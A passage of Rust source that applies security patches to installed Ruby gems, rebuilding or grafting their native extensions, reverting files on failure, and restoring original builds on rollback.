/// `dry_run`, would hold them once `apply` ran) while its compiled code
/// stays what it was, because `why`: the text of an incomplete patch
/// ([`GemCaveat::Incomplete`]). `inputs` names the record's sources that
/// are in no compiled code ([`list_inputs`]).
fn not_compiled_detail(inputs: &str, why: &str, dry_run: bool) -> String {
    if dry_run {
        format!(
            "dry run: apply would write the patch's files, but its native-extension sources \
             ({inputs}) would not be in the compiled code this install runs: {why}. That code \
             would stay as it was installed, only the patch's other files would be in effect, \
             and vex would not attest the patch"
        )
    } else {
        format!(
            "the patch's files were written, but its native-extension sources ({inputs}) are \
             not in the compiled code this install runs: {why}. That code is as it was \
             installed, only the patch's other files are in effect, and vex does not attest \
             the patch"
        )
    }
}

/// One gem copy's record, verified against the copy and about to be built.
struct Job<'a> {
    read_scope: crate::utils::repo_root::ReadScope,
    package_key: &'a str,
    pkg_path: &'a Path,
    /// The record's files.
    files: &'a HashMap<String, PatchFileInfo>,
    /// The record as the installed copy takes it
    /// ([`files_as_installed`]).
    installed_files: &'a HashMap<String, PatchFileInfo>,
    sources: &'a PatchSources<'a>,
    policy: MismatchPolicy,
    env: &'a RubyEnv,
    copy: &'a GemCopy,
    scope: &'a NativeScope,
    /// [`list_inputs`] of the scope, for the messages.
    inputs: &'a str,
}

impl Job<'_> {
    fn refuse(&self, code: &str, detail: String) -> GemApplied {
        refusal(self.package_key, self.pkg_path, code, detail)
    }

    /// The bytes each record file holds now, to put back if what follows
    /// fails.
    async fn originals(&self) -> Vec<(String, Option<Vec<u8>>)> {
        let keys: Vec<String> = self.files.keys().cloned().collect();
        let dir = self.pkg_path.to_path_buf();
        crate::utils::fs::run_blocking(move || {
            keys.into_iter()
                .filter(|k| is_safe_relative_subpath(normalize_file_path(k)))
                .map(|k| {
                    let bytes = read_regular_to_bytes_sync(&dir.join(normalize_file_path(&k))).ok();
                    (k, bytes)
                })
                .collect()
        })
        .await
    }

    /// Write the record's patched files into the installed copy. A write
    /// that fails is undone here: the result then lists nothing as patched.
    async fn write_sources(&self, originals: &[(String, Option<Vec<u8>>)]) -> ApplyResult {
        let mut result = apply_package_patch(
            self.read_scope,
            self.package_key,
            self.pkg_path,
            self.installed_files,
            self.sources,
            false,
            self.policy,
        )
        .await;
        if !result.success {
            revert_sources(self.pkg_path, originals, &result.files_patched).await;
            result.files_patched.clear();
            result.applied_via.clear();
        }
        result
    }

    /// The outcome of a copy whose sources are written and whose compiled
    /// code was built from them.
    fn built(&self, result: ApplyResult) -> GemApplied {
        let warning = result.files_patched.is_empty().then(|| {
            (
                REBUILT_CODE.to_string(),
                format!(
                    "{}: its native extension was rebuilt from sources that were already \
                     patched ({})",
                    self.package_key, self.inputs
                ),
            )
        });
        GemApplied {
            result,
            warning,
            caveat: None,
        }
    }

    /// The outcome of a copy that holds the record's files (`result` wrote
    /// them, or found them written) while its compiled code is what it
    /// was: a clean build showed that this install compiles nothing of the
    /// record (`why`). The patch is incomplete
    /// ([`GemCaveat::Incomplete`]), and nothing is put back. No marker is
    /// written, so `vex` and `apply --check` do not take the copy for
    /// patched ([`verify_native_build`]).
    fn not_compiled(&self, result: ApplyResult, why: &str) -> GemApplied {
        GemApplied::incomplete(
            result,
            self.package_key,
            not_compiled_detail(self.inputs, why, false),
        )
    }

    /// Write the record's files into a copy whose build showed that it
    /// compiles nothing of them (`why`), and report the patch as incomplete
    /// ([`not_compiled`](Self::not_compiled)): the patch's Ruby files take
    /// effect, and a file the gem compiles later on its own (one that
    /// builds its binary when it first runs) is the patched one (#2144).
    /// A record with a build input the copy does not hold (`absent`) is
    /// refused instead: only a build from the source gem accounts for a
    /// file added that way ([`files_as_installed`]).
    async fn write_without_build(&self, absent: &[String], why: &str) -> GemApplied {
        if !absent.is_empty() {
            return self.refuse(
                UNSUPPORTED_CODE,
                format!(
                    "the patch changes native-extension sources ({}), and they cannot take \
                     effect on this install: {why}; nothing was written.",
                    self.inputs
                ),
            );
        }
        let originals = self.originals().await;
        let result = self.write_sources(&originals).await;
        if !result.success {
            return GemApplied {
                result,
                warning: None,
                caveat: None,
            };
        }
        self.not_compiled(result, why)
    }

    /// The outcome of a copy that is as it was before the run, because
    /// `detail` (a [`BUILD_FAILED_CODE`] failure).
    async fn not_built(
        &self,
        mut result: ApplyResult,
        originals: &[(String, Option<Vec<u8>>)],
        detail: String,
    ) -> GemApplied {
        revert_sources(self.pkg_path, originals, &result.files_patched).await;
        result.success = false;
        result.files_patched.clear();
        result.applied_via.clear();
        // What the written sources were advised about (`bundle install
        // --redownload` reverts them) is not true of a copy put back. It
        // still is of one an earlier run left a patched file in, which
        // this run did not write and so did not put back.
        let patched_before = result
            .files_verified
            .iter()
            .any(|v| v.status == crate::patch::apply::VerifyStatus::AlreadyPatched);
        if !patched_before {
            result.sidecar = None;
        }
        result.error = Some(format!("{BUILD_FAILED_CODE}: {detail}"));
        GemApplied {
            caveat: None,
            result,
            warning: Some((BUILD_FAILED_CODE.to_string(), detail)),
        }
    }
}

/// The remedy a refusal names for a gem RubyGems built at install time:
/// hosted mode installs the patched ruby-platform gem.
const HOSTED_HINT: &str = "Use `socket-patch scan --mode hosted`, which installs the patched gem \
                           through Bundler so RubyGems compiles it.";

/// Why the jars of a JVM gem are not a build of a record that changes what
/// they were built from ([`Job::not_compiled`]).
const JARS_NOT_REBUILT: &str = "the gem's jars were built from Java sources the patch changes, \
                                and they cannot be rebuilt here";

/// One record applied to the JVM build of a gem: the copy JRuby installs,
/// whose compiled code is jars. Nothing is built and no Ruby is started.
/// The files the copy takes of the record are written ([`jvm_record`]),
/// and that is the whole patch unless the record changes sources of the
/// gem's jars without bringing the compiled code
/// ([`jvm_unbuilt_inputs`]): the jars were built from those, so the copy's
/// compiled code is then not the patch's, and the patch is incomplete
/// ([`GemCaveat::Incomplete`]).
struct JvmApply<'a> {
    read_scope: crate::utils::repo_root::ReadScope,
    package_key: &'a str,
    pkg_path: &'a Path,
    sources: &'a PatchSources<'a>,
    dry_run: bool,
    policy: MismatchPolicy,
    env: &'a RubyEnv,
    copy: &'a GemCopy,
    /// The copy's platform (`java`).
    platform: &'a str,
    release: Option<GemId>,
}

impl JvmApply<'_> {
    /// The result of a copy this run verifies and writes nothing in.
    fn untouched(&self) -> ApplyResult {
        untouched_result(self.package_key, self.pkg_path, None)
    }

    async fn plain(&self, files: &HashMap<String, PatchFileInfo>) -> GemApplied {
        plain_apply(
            self.read_scope,
            self.package_key,
            self.pkg_path,
            files,
            self.sources,
            self.dry_run,
            self.policy,
        )
        .await
    }

    async fn apply(&self, files: &HashMap<String, PatchFileInfo>) -> GemApplied {
        let record = jvm_record(&self.copy.gem_dir, self.platform, self.package_key, files).await;
        let full_name = &self.copy.full_name;
        if record.jvm_inputs.is_empty() {
            // The code the record changes is not in this build at all.
            if record.files.is_empty() && !files.is_empty() {
                let detail = format!(
                    "none of the patch's files are part of the JRuby build of this gem \
                     ({full_name}): the code the patch changes is not in that build, so there \
                     is nothing to patch and nothing was written"
                );
                return GemApplied {
                    result: self.untouched(),
                    warning: None,
                    caveat: Some(GemCaveat::NotInBuild(detail)),
                };
            }
            return self.plain(&record.files).await;
        }

        // The record changes what the gem's jars were built from.
        let scope = NativeScope {
            inputs: record.jvm_inputs.clone(),
            builds_extensions: false,
            precompiled: Some(self.platform.to_string()),
            release: self.release.clone(),
        };
        let inputs = list_inputs(&scope);
        // Nothing of the record is in the copy to write, and its jars may
        // hold the code the patch fixes: incomplete, whoever compiles.
        if record.files.is_empty() {
            let detail = format!(
                "none of the patch's files are in the JRuby build of this gem ({full_name}) to \
                 write, and it changes sources of the gem's jars ({inputs}): \
                 {JARS_NOT_REBUILT}. Nothing was written, and vex does not attest the patch"
            );
            return GemApplied::incomplete(self.untouched(), self.package_key, detail);
        }
        // `--no-gem-native-rebuild`: the caller compiles what the patch
        // changes itself, so the files are written and the rest is the
        // caller's, as for an extension.
        if !self.env.rebuild {
            let mut applied = self.plain(&record.files).await;
            if applied.result.success {
                applied.warning = Some(opted_out_warning(
                    self.package_key,
                    &inputs,
                    true,
                    self.dry_run,
                ));
            }
            return applied;
        }
        // Files alone show what a real run comes to here, so a dry run
        // says the same: the record verifies, and the patch would be
        // incomplete.
        if self.dry_run {
            let verified = self.plain(&record.files).await;
            if !verified.result.success {
                return verified;
            }
            return GemApplied::incomplete(
                verified.result,
                self.package_key,
                not_compiled_detail(&inputs, JARS_NOT_REBUILT, true),
            );
        }
        let job = Job {
            read_scope: self.read_scope,
            package_key: self.package_key,
            pkg_path: self.pkg_path,
            files: &record.files,
            installed_files: &record.files,
            sources: self.sources,
            policy: self.policy,
            env: self.env,
            copy: self.copy,
            scope: &scope,
            inputs: &inputs,
        };
        job.write_without_build(&[], JARS_NOT_REBUILT).await
    }
}

/// [`apply_package_patch`] for one installed gem copy, rebuilding its
/// native extension when the record changes a build input (see the module
/// docs). A record without native inputs is applied exactly as
/// [`apply_package_patch`] applies it. The JVM build of a gem is never
/// rebuilt: it takes the record's files that are part of that build
/// ([`JvmApply`]). A JVM-platform gem that declares extensions is no such
/// build, and is rebuilt like any gem RubyGems built.
#[allow(clippy::too_many_arguments)]
pub async fn apply_gem_package_patch(
    read_scope: crate::utils::repo_root::ReadScope,
    package_key: &str,
    pkg_path: &Path,
    files: &HashMap<String, PatchFileInfo>,
    sources: &PatchSources<'_>,
    dry_run: bool,
    policy: MismatchPolicy,
    env: &RubyEnv,
) -> GemApplied {
    let gem = InstalledGem::at(pkg_path).await;
    // The JVM build of a gem has no extension to rebuild: the record is
    // applied as far as it concerns that build.
    if let Some((copy, platform)) = gem.jvm() {
        let jvm = JvmApply {
            read_scope,
            package_key,
            pkg_path,
            sources,
            dry_run,
            policy,
            env,
            copy,
            platform,
            release: gem.facts.release.clone(),
        };
        return jvm.apply(files).await;
    }
    let scope = gem.scope(files);
    let copy = gem.copy;
    if scope.inputs.is_empty() {
        return plain_apply(
            read_scope,
            package_key,
            pkg_path,
            files,
            sources,
            dry_run,
            policy,
        )
        .await;
    }
    let inputs = list_inputs(&scope);
    // A rebuild of this copy that an earlier run started and did not finish
    // (it was interrupted, or killed) left the previous build parked: the
    // copy is put back together before anything else, so what follows
    // sees a whole gem. A dry run changes nothing and reads the parked
    // build where it is.
    if let (false, Some(copy)) = (dry_run, &copy) {
        if let Err(e) = recover_interrupted_rebuild(copy).await {
            return refusal(
                package_key,
                pkg_path,
                UNSUPPORTED_CODE,
                format!(
                    "the patch changes native-extension sources ({inputs}), and {}; nothing \
                     was written",
                    recovery_refusal(copy, &e)
                ),
            );
        }
    }
    // `--no-gem-native-rebuild`: the caller compiles the extension itself
    // (the patches evaluation harness does), so the sources are written as
    // before #1996, and the warning says the build is the caller's.
    if !env.rebuild {
        let mut applied = plain_apply(
            read_scope,
            package_key,
            pkg_path,
            files,
            sources,
            dry_run,
            policy,
        )
        .await;
        if applied.result.success {
            applied.warning = Some(opted_out_warning(package_key, &inputs, false, dry_run));
        }
        return applied;
    }
    let Some(copy) = copy else {
        return refusal(
            package_key,
            pkg_path,
            UNSUPPORTED_CODE,
            format!(
                "the patch changes native-extension sources ({inputs}), but {} is not a \
                 RubyGems install with a specification to rebuild the extension from; \
                 nothing was written. {HOSTED_HINT}",
                pkg_path.display()
            ),
        );
    };
    if !scope.builds_extensions && scope.precompiled.is_none() {
        return refusal(
            package_key,
            pkg_path,
            UNSUPPORTED_CODE,
            format!(
                "the patch changes native-extension sources ({inputs}), but the installed gem \
                 builds no extension at install time and is not a precompiled platform gem, \
                 so nothing here compiles them and they cannot take effect; nothing was \
                 written."
            ),
        );
    }
    let precompiled = scope.precompiled.is_some();
    let (installed_files, absent) = files_as_installed(&copy, &scope, files).await;

    // Already patched and built from these sources: nothing to do, and no
    // Ruby is started. The one exception is a precompiled copy grafted for
    // one Ruby whose gem home another Ruby may share: `apply` under that
    // other Ruby grafts its binary too, and only the Ruby that runs can
    // say which it is. A dry run asks nothing.
    let built = {
        let (copy, scope, files) = (copy.clone(), scope.clone(), files.clone());
        crate::utils::fs::run_blocking(move || built_state(&copy, &scope, &files)).await
    };
    let unchanged = || {
        plain_apply(
            read_scope,
            package_key,
            pkg_path,
            &installed_files,
            sources,
            dry_run,
            policy,
        )
    };
    let grafted_for = match built {
        Built::Yes => return unchanged().await,
        Built::ForRubies(_) if dry_run => return unchanged().await,
        Built::ForRubies(minors) => Some(minors),
        Built::No => None,
    };

    // A gem RubyGems built can also be installed patched through hosted
    // mode; a precompiled one cannot (hosted mode refuses platform gems).
    let hint = if precompiled {
        String::new()
    } else {
        format!(" {HOSTED_HINT}")
    };
    let unbuildable = |why: String| {
        refusal(
            package_key,
            pkg_path,
            UNSUPPORTED_CODE,
            format!(
                "the patch changes native-extension sources ({inputs}), which only take \
                 effect once the extension is rebuilt, and it cannot be rebuilt here: \
                 {why}; nothing was written.{hint}"
            ),
        )
    };
    // What files alone tell: a build to replace and a Ruby to try.
    let preflight = match rebuild_preflight(&copy, env, precompiled).await {
        Ok(p) => p,
        // Built already, and no Ruby here to ask whether it is another's.
        Err(_) if grafted_for.is_some() => return unchanged().await,
        Err(why) => return unbuildable(why),
    };
    // A precompiled gem's extension can only be rebuilt from the source gem
    // of its version. Without that archive in the gem home's cache and
    // without the network, files alone tell there is no way to it.
    let gems = GemSource::of(&env.cwd, env.offline).await;
    let source = scope.source_gem();
    let needs_source_gem = |source: Option<&GemId>, why: String, missing: bool| {
        let archive = match source {
            Some(source) => format!("{}.gem", source.full_name()),
            None => "its ruby-platform gem".to_string(),
        };
        let remedy = match source {
            Some(source) if missing => format!(" {}", gems.remedy(&copy.home, source)),
            _ => String::new(),
        };
        refusal(
            package_key,
            pkg_path,
            UNSUPPORTED_CODE,
            format!(
                "the patch changes native-extension sources ({inputs}) of the precompiled gem \
                 {}, which only take effect once its extension is rebuilt from the source gem \
                 ({archive}), and that cannot be done here: {why}; nothing was written.{remedy}",
                copy.full_name
            ),
        )
    };
    let unnamed = || {
        format!(
            "{} does not name the gem and version it was installed from",
            copy.spec_path.display()
        )
    };
    if precompiled && grafted_for.is_none() {
        let Some(source) = &source else {
            return needs_source_gem(None, unnamed(), false);
        };
        if let Some(why) = gems.out_of_reach(&copy.home, source).await {
            return needs_source_gem(Some(source), why, true);
        }
    }

    // So can a gem RubyGems built, when the record changes an input its
    // build removed from the installed copy.
    if !precompiled && !absent.is_empty() {
        let out_of_reach = match &source {
            Some(source) => gems.out_of_reach(&copy.home, source).await,
            None => Some(unnamed()),
        };
        if let Some(why) = out_of_reach {
            let remedy = source.as_ref().map(|s| gems.remedy(&copy.home, s));
            return refusal(
                package_key,
                pkg_path,
                UNSUPPORTED_CODE,
                absent_inputs_detail(&inputs, &absent, &why, remedy.as_deref()),
            );
        }
    }

    // No program runs until the record's files verify against this copy:
    // until then nothing says the tree is the package the patch is for.
    // The pass writes nothing, and a dry run ends with it.
    let verified = apply_package_patch(
        read_scope,
        package_key,
        pkg_path,
        &installed_files,
        sources,
        true,
        policy,
    )
    .await;
    if !verified.success {
        return GemApplied {
            caveat: None,
            result: verified,
            warning: None,
        };
    }
    if dry_run {
        // The build is not one made from these sources (the marker check
        // above), so a real run rebuilds it: the warning says what `apply`
        // would still do (with every source already patched, where the
        // event reads `already_patched`, its `native_extension_rebuilt`).
        // Whether a Ruby here can build it is left to that run.
        let all_patched = !verified.files_verified.is_empty()
            && verified
                .files_verified
                .iter()
                .all(|v| v.status == crate::patch::apply::VerifyStatus::AlreadyPatched);
        let parked = !precompiled
            && preflight
                .installed
                .iter()
                .any(|dir| is_real_dir(&parked_build_path(dir)));
        let unfinished = if parked {
            "; an earlier rebuild did not finish, and apply first puts back the build it parked"
        } else {
            ""
        };
        let detail = match (all_patched, precompiled) {
            (true, false) => format!(
                "{package_key}: dry run: its sources are already patched, but its native \
                 extension was not built from them ({inputs}); apply would rebuild \
                 it{unfinished}"
            ),
            (false, false) => format!(
                "{package_key}: dry run: apply would write its patched sources and rebuild \
                 its native extension from them ({inputs}); no Ruby was run to check that \
                 it can{unfinished}"
            ),
            (true, true) => format!(
                "{package_key}: dry run: its sources are already patched, but the gem's \
                 precompiled extension was not built from them ({inputs}); apply would \
                 rebuild it from the source gem and replace the prebuilt binary with that \
                 build"
            ),
            (false, true) => format!(
                "{package_key}: dry run: apply would write its patched sources, rebuild its \
                 native extension from the source gem and replace the gem's prebuilt binary \
                 with that build ({inputs}); no Ruby was run and nothing was downloaded to \
                 check that it can"
            ),
        };
        return GemApplied {
            caveat: None,
            result: verified,
            warning: Some((REBUILT_CODE.to_string(), detail)),
        };
    }

    let probe = match find_ruby(&copy, env, preflight, scope.precompiled.as_deref()).await {
        Ok(p) => p,
        Err(_) if grafted_for.is_some() => return unchanged().await,
        Err(why) => return unbuildable(why),
    };
    // A copy grafted already: this Ruby's binary is among the grafted ones
    // (or it did not say which Ruby it is), and nothing is left to build.
    // Otherwise it is another Ruby of a shared gem home, and its binary is
    // grafted beside the others.
    if let Some(grafted) = &grafted_for {
        let minor = probe.facts.as_ref().and_then(RubyFacts::minor);
        if minor.is_none_or(|minor| grafted.contains(&minor)) {
            return unchanged().await;
        }
    }
    let job = Job {
        read_scope,
        package_key,
        pkg_path,
        files,
        installed_files: &installed_files,
        sources,
        policy,
        env,
        copy: &copy,
        scope: &scope,
        inputs: &inputs,
    };

    // The source gem holds every build input, where the installed copy may
    // not (a build deletes what it no longer needs; a precompiled gem never
    // shipped them): the extension is rebuilt from it when it can be had.
    let record = StagedRecord {
        read_scope,
        package_key,
        pkg_path,
        scope: &scope,
        files,
        sources,
    };
    let staged = match &source {
        None => Err(StageFailure::NoArchive(unnamed())),
        Some(source) => match gems.archive(&copy.home, source).await {
            Err(why) => Err(StageFailure::NoArchive(why)),
            Ok(archive) => {
                build_from_source_gem(&copy, &probe, source, archive, &gems, env, Some(&record))
                    .await
            }
        },
    };
    let failure = match staged {
        Ok((stage, built)) => {
            // A gem RubyGems built loads what its build leaves in the
            // extension dir. A build that leaves nothing there (and nothing
            // Ruby loads in the gem's tree: `in_tree_products`) made
            // nothing to install, and moving its empty dir in would pass
            // for a build of the patch (#2144).
            let nothing_built = !precompiled && {
                let dir = built.extension_dir.clone();
                crate::utils::fs::run_blocking(move || artifact_rels(&dir).is_empty()).await
            };
            let applied = if nothing_built {
                job.write_without_build(&absent, NOTHING_BUILT).await
            } else if precompiled {
                graft_into_copy(&job, &probe, &built, &absent).await
            } else {
                move_into_copy(&job, &probe, &built, &absent).await
            };
            close_stage(stage, &copy).await;
            return applied;
        }
        Err(failure) => failure,
    };
    let remedy = match (&failure, &source) {
        (StageFailure::NoArchive(_), Some(source)) => Some(gems.remedy(&copy.home, source)),
        _ => None,
    };
    match failure {
        // Another run is building this gem: nothing else is tried.
        StageFailure::Busy(why) => unbuildable(why),
        // A build of the installed tree would read as little: the patch's
        // native part has nothing to take effect in on this install.
        StageFailure::NotRead => job.write_without_build(&absent, NOT_READ).await,
        // A gem RubyGems built can still be built where it is installed,
        // as it was before there was a stage: nothing was written yet.
        failure if !precompiled => {
            rebuild_in_place(&job, &probe, &absent, &failure, remedy.as_deref()).await
        }
        StageFailure::Build(diagnostic) => {
            // The source gem the stage was built from, by name and
            // version: what the same build is run with outside this tool.
            let install = match &source {
                Some(source) => format!(
                    "gem install {} -v {} --platform ruby",
                    source.name, source.version
                ),
                None => format!(
                    "gem install {} --platform ruby",
                    gem_name_of(&copy.full_name)
                ),
            };
            refusal(
                package_key,
                pkg_path,
                BUILD_FAILED_CODE,
                format!(
                    "the native extension did not build from the patched sources ({inputs}); \
                     nothing of the installed gem was changed. {} was installed precompiled, \
                     so nothing of it was built on this machine before: the rebuild needs \
                     what `{install}` needs, which is a compiler toolchain, the Ruby headers \
                     and the libraries the gem builds against. The lines below say what \
                     failed; when they name something as missing, install it and apply \
                     again.\n{diagnostic}",
                    copy.full_name
                ),
            )
        }
        failure => needs_source_gem(source.as_ref(), failure.describe(), remedy.is_some()),
    }
}

/// The refusal of a record that changes build inputs the installed copy of
/// a gem RubyGems built no longer holds (`absent`), when the extension
/// cannot be rebuilt from the source gem that packs them (`why`).
fn absent_inputs_detail(
    inputs: &str,
    absent: &[String],
    why: &str,
    remedy: Option<&str>,
) -> String {
    let remedy = remedy.map(|r| format!(" {r}")).unwrap_or_default();
    format!(
        "the patch changes native-extension sources ({inputs}), and the installed gem does not \
         hold {} (a build removes what it is done with), so the extension can only be rebuilt \
         from the source gem, and that cannot be done here: {why}; nothing was written.{remedy}",
        absent.join(", ")
    )
}

/// Write the patched sources and rebuild the extension from the installed
/// copy's own tree ([`rebuild`]): what is left to a gem RubyGems built when
/// it could not be rebuilt from its source gem (`staged` says why, `remedy`
/// what would get the archive). A failed build puts the sources and the
/// previous build back, and its error names both failures. A record that
/// changes a build input the copy no longer holds (`absent`) cannot be
/// built this way: nothing here has the file's content to check the record
/// against.
async fn rebuild_in_place(
    job: &Job<'_>,
    probe: &Probe,
    absent: &[String],
    staged: &StageFailure,
    remedy: Option<&str>,
) -> GemApplied {
    if !absent.is_empty() {
        return job.refuse(
            UNSUPPORTED_CODE,
            absent_inputs_detail(job.inputs, absent, &staged.describe(), remedy),
        );
    }
    let originals = job.originals().await;
    let result = job.write_sources(&originals).await;
    if !result.success {
        return GemApplied {
            caveat: None,
            result,
            warning: None,
        };
    }
    // What the source gem's build showed of this gem's build.
    let nothing = SeenInStage::default();
    let seen = match staged {
        StageFailure::InTree { seen, .. } => seen,
        _ => &nothing,
    };
    match rebuild(job.copy, probe, job.scope, job.files, job.env, true, seen).await {
        Ok(()) => job.built(result),
        // The previous build is back, and the sources stay written.
        Err(NotRebuilt::NotOfPatch(why)) => job.not_compiled(result, &why),
        Err(NotRebuilt::Failed(diagnostic)) => {
            // An installed tree may no longer hold what its build needs
            // (nokogiri's deletes `ports/`): the source gem would.
            let remedy = remedy.map(|r| format!(" {r}")).unwrap_or_default();
            let both = match staged {
                StageFailure::Build(first) => format!(
                    " A rebuild from its source gem was tried first and failed \
                     too:\n{first}\nThen, from the installed gem's own files:"
                ),
                other => format!(
                    " It was built from the installed gem's own files, which a build can \
                     leave incomplete, because it could not be rebuilt from its source gem \
                     ({}).{remedy}",
                    other.describe()
                ),
            };
            let detail = format!(
                "the native extension did not build from the patched sources ({}); the \
                 sources and the previous build were put back. The lines below say what \
                 failed: when it is a missing compiler, the Ruby headers or a library the \
                 gem builds against, install that and apply again; otherwise use \
                 `socket-patch scan --mode hosted`.{both}\n{diagnostic}",
                job.inputs
            );
            job.not_built(result, &originals, detail).await
        }
    }
}

/// Put a staged build into a copy RubyGems built: its sources are written
/// in place, and the staged build takes the place of its extension dir
/// ([`install_staged_build`]). A step that fails leaves the copy as it was.
async fn move_into_copy(
    job: &Job<'_>,
    probe: &Probe,
    built: &StagedBuild,
    absent: &[String],
) -> GemApplied {
    let originals = job.originals().await;
    let result = job.write_sources(&originals).await;
    if !result.success {
        return GemApplied {
            caveat: None,
            result,
            warning: None,
        };
    }
    let installed = {
        let (copy, probe, scope) = (job.copy.clone(), probe.clone(), job.scope.clone());
        let (files, built, absent) = (job.files.clone(), built.clone(), absent.to_vec());
        crate::utils::fs::run_blocking(move || {
            install_staged_build(&copy, &probe, &scope, &files, &built, Some(&absent))
        })
        .await
    };
    match installed {
        Ok(()) => job.built(result),
        Err(why) => {
            let detail = format!(
                "the native extension was rebuilt from the patched sources ({}), but {why}; \
                 the sources and the previous build were put back.",
                job.inputs
            );
            job.not_built(result, &originals, detail).await
        }
    }
}

/// Put a staged build into a precompiled copy: the record's files are
/// written into the copy, and each prebuilt binary the owning Ruby loads is
/// replaced by the build's ([`plan_graft`]), after the originals are backed
/// up. A step that fails leaves the copy as it was.
async fn graft_into_copy(
    job: &Job<'_>,
    probe: &Probe,
    built: &StagedBuild,
    absent: &[String],
) -> GemApplied {
    let (copy, inputs) = (job.copy, job.inputs);
    let planned = {
        let (copy, probe, built) = (copy.clone(), probe.clone(), built.clone());
        crate::utils::fs::run_blocking(move || plan_graft(&copy, &probe, &built)).await
    };
    let unplaceable = |why: String| {
        job.refuse(
            UNSUPPORTED_CODE,
            format!(
                "the patch changes native-extension sources ({inputs}) of the precompiled gem \
                 {}, and its extension was rebuilt from the source gem, but the build cannot \
                 take the place of the gem's prebuilt binary: {why}; nothing was written.",
                copy.full_name
            ),
        )
    };
    let grafts = match planned {
        Ok(grafts) => grafts,
        Err(why) => return unplaceable(why),
    };
    let made_backup = {
        let (copy, grafts, absent) = (copy.clone(), grafts.clone(), absent.to_vec());
        crate::utils::fs::run_blocking(move || back_up_prebuilt(&copy, &grafts, &absent)).await
    };
    let made_backup = match made_backup {
        Ok(made) => made,
        Err(e) => {
            let stage = copy.gem_dir.join(format!("{BACKUP_DIR}.tmp"));
            let _ = crate::utils::fs::run_blocking(move || remove_dir_if_exists(&stage)).await;
            return unplaceable(format!("the prebuilt binary could not be backed up ({e})"));
        }
    };
    let drop_new_backup = || async {
        if made_backup {
            let backup = copy.gem_dir.join(BACKUP_DIR);
            let _ = crate::utils::fs::run_blocking(move || remove_dir_if_exists(&backup)).await;
        }
    };
    let originals = job.originals().await;
    let result = job.write_sources(&originals).await;
    if !result.success {
        drop_new_backup().await;
        return GemApplied {
            caveat: None,
            result,
            warning: None,
        };
    }
    let grafted = {
        let (copy, scope) = (copy.clone(), job.scope.clone());
        let (files, grafts) = (job.files.clone(), grafts.clone());
        crate::utils::fs::run_blocking(move || graft_binaries(&copy, &scope, &files, &grafts)).await
    };
    match grafted {
        Ok(()) => job.built(result),
        Err(e) => {
            drop_new_backup().await;
            let detail = format!(
                "the native extension was rebuilt from the patched sources ({inputs}), but \
                 the build could not replace the gem's prebuilt binary ({e}); the sources and \
                 the prebuilt binary were put back."
            );
            job.not_built(result, &originals, detail).await
        }
    }
}

/// Put the files a failed gem apply wrote back to the bytes they held
/// before it (a file it created is removed). Best effort: the apply already
/// fails.
async fn revert_sources(
    pkg_path: &Path,
    originals: &[(String, Option<Vec<u8>>)],
    written: &[String],
) {
    for key in written {
        let Some((_, before)) = originals.iter().find(|(k, _)| k == key) else {
            continue;
        };
        match before {
            Some(bytes) => {
                let hash = compute_git_sha256_from_bytes(bytes);
                let _ = apply_file_patch_at(pkg_path, key, bytes, &hash).await;
            }
            None => {
                let _ =
                    crate::utils::fs::remove_file(&pkg_path.join(normalize_file_path(key))).await;
            }
        }
    }
}

/// After `rollback` put a gem copy's sources back: put its original compiled
/// extension back too. The backup [`apply_gem_package_patch`] took is
/// restored whenever it exists: it is this gem version's install-time build
/// (for a precompiled copy, the prebuilt binaries the gem shipped), right
/// whether the current build is socket-patch's (marker present) or one
/// whose marker never got written. Without a backup, a copy carrying a
/// socket-patch build (a marker) is rebuilt from the restored sources: from
/// its source gem when that can be had, else in place. A precompiled copy
/// without its backup is not rebuilt (that would not give the prebuilt
/// binaries back): the error names `gem pristine`, which reinstalls them.
/// A rebuild an earlier run did not finish is put right first
/// ([`recover_interrupted_rebuild`]), so the build parked by it is back
/// before any of that. `Ok(true)` when a build was restored, `Ok(false)`
/// when the copy carries neither.
pub async fn restore_original_build(pkg_path: &Path, env: &RubyEnv) -> Result<bool, String> {
    let Some(copy) = GemCopy::of(pkg_path) else {
        return Ok(false);
    };
    let recovered = recover_interrupted_rebuild(&copy)
        .await
        .map_err(|e| recovery_refusal(&copy, &e))?;
    let backup = copy.gem_dir.join(BACKUP_DIR);
    let pristine_hint = format!(
        "run `gem pristine {} --extensions`",
        gem_name_of(&copy.full_name)
    );
    // What the copy carries. Only "not there" says it has no backup and no
    // marker: one that cannot be probed or read may be all that says the
    // compiled code is not the gem's own, and taking it for absent would
    // report a copy with nothing to restore, or rebuild over a backup that
    // was never put back.
    let carried = {
        let (gem_dir, backup) = (copy.gem_dir.clone(), backup.clone());
        crate::utils::fs::run_blocking(move || -> std::io::Result<_> {
            refuse_link(&backup, "a backup this tool made")?;
            if try_entry_type(&backup.join(BACKUP_INFO))?.is_some() {
                // The backup is this gem version's install-time build
                // whatever the marker says, or fails to say.
                return Ok((true, read_marker_sync(&gem_dir)));
            }
            Ok((false, read_marker_strict(&gem_dir)?))
        })
        .await
    };
    let (has_backup, marker) =
        carried.map_err(|e| format!("{e}; left as it is, {pristine_hint}"))?;
    if has_backup {
        let c = copy.clone();
        return crate::utils::fs::run_blocking(move || restore_backup(&c, marker.as_ref()))
            .await
            .map(|()| true)
            .map_err(|e| {
                format!(
                    "could not put the original native extension build back ({e}); run `gem \
                     pristine {} --extensions` to rebuild it",
                    gem_name_of(&copy.full_name)
                )
            });
    }
    let Some(marker) = marker else {
        return Ok(recovered);
    };
    if marker.grafted {
        return Err(format!(
            "the gem's prebuilt binary still holds the patched build, and the backup of the \
             original is gone; run `gem pristine {}` to reinstall the gem as it shipped",
            gem_name_of(&copy.full_name)
        ));
    }
    if !env.rebuild {
        return Err(format!(
            "the compiled extension still holds the patched build, and no backup of the \
             original is left to restore without a rebuild (--no-gem-native-rebuild); \
             {pristine_hint}"
        ));
    }
    // No backup: rebuild from the restored sources.
    let found = match rebuild_preflight(&copy, env, false).await {
        Ok(preflight) => find_ruby(&copy, env, preflight, None).await,
        Err(why) => Err(why),
    };
    let probe = found.map_err(|why| {
        format!(
            "the compiled extension still holds the patched build and cannot be rebuilt here \
             ({why}); run `gem pristine {} --extensions`",
            gem_name_of(&copy.full_name)
        )
    })?;
    let rebuilt = match rebuild_unpatched_from_source_gem(&copy, &probe, env).await {
        Ok(rebuilt) => rebuilt,
        Err(seen) => {
            let scope = NativeScope::default();
            rebuild(&copy, &probe, &scope, &HashMap::new(), env, false, &seen)
                .await
                .map_err(NotRebuilt::into_detail)
        }
    };
    rebuilt.map_err(|diagnostic| {
        format!(
            "the extension did not rebuild from the restored sources; run `gem pristine \
